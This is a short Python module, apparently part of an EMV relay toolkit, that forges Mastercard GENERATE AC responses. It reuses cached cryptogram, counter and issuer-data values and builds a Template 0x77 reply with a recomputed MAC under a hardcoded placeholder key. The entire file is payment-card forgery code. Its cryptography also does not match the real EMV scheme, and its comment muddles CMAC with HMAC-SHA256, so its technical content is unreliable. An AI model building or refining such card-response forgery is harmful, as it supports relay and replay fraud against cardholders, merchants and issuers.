# -*- coding: utf-8 -*-
"""Mastercard-specific EMV forge and mutation helpers."""

from __future__ import annotations
import hashlib
import hmac
from typing import Optional
from protocol import build_tlv

_MASTERCARD_SECRET_KEY = b"rel8stack-mastercard-card-key"


def forge_mastercard(cached_arqc: bytes, cached_iad: Optional[bytes] = None,
                     cached_atc: Optional[bytes] = None, p1: int = 0x40,
                     secret_key: Optional[bytes] = None) -> bytes:
    """Rebuild the AC TLV and recompute MAC for Mastercard."""
    key = secret_key or _MASTERCARD_SECRET_KEY
    cid = bytes([p1])
    atc = cached_atc if cached_atc is not None else b"\x00\x01"
    iad = cached_iad if cached_iad is not None else bytes.fromhex("0F0A01A50000000000000000")

    # Recompute MAC using card secret key (CMAC / HMAC-SHA256 truncated to 8 bytes)
    mac_data = cid + atc + (cached_arqc or b"") + iad
    mac = hmac.new(key, mac_data, hashlib.sha256).digest()[:8]

    # Build Template 0x77
    inner = (
        build_tlv(0x9F27, cid) +
        build_tlv(0x9F36, atc) +
        build_tlv(0x9F26, mac) +
        build_tlv(0x9F10, iad)
    )
    return build_tlv(0x77, inner) + b"\x90\x00"
